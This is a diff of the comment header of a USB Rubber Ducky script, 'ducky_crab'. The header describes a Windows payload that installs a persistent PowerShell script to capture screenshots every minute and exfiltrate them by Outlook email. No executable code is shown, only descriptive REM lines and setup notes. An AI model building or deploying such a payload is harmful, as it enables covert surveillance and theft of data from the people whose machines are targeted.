@@ -1,13 +1,12 @@
 REM Title: ducky_crab
 REM Author: the-jcksn
-REM Description: Gives "screen crab" like capabilities to the USB rubber ducky
-REM Description2: Creates a powershell script that captures screenshots and exfiltrates them via outlook, once a minute, even after the USB rubber ducky has been removed.
+REM Description: Gives "screen crab" like capabilities to the USB rubber ducky. Creates a powershell script that captures screenshots and exfiltrates them via outlook, once a minute, even after the USB rubber ducky has been removed.
 REM Target: Windows
 REM Version: 1.0
 REM Category: Exfiltration
 
-REM ~~~~ You must change USER@EXAMPLE.com and USERPASSWORD to your outlook credentials (line 46)
-REM ~~~~ Change the time for the payload to run after ducky is removed (default 10 minutes - line 39)
+REM ~~~~ You must change USER@EXAMPLE.com and USERPASSWORD to your outlook credentials (line 45)
+REM ~~~~ Change the time for the payload to run after ducky is removed (default 10 minutes - line 38)
 REM ~~~~ DO NOT REMOVE THE RUBBER DUCKY UNTIL THE PROMPT APPEARS ON SCREEN SAYING TO DO SO, after this, the payload will run without the ducky inserted
 REM ~~~~ You might have to adjust the delays, depending on the target machine, but these worked ok for me.
 REM ~~~~ Use responsibly, and within the confines of the law.
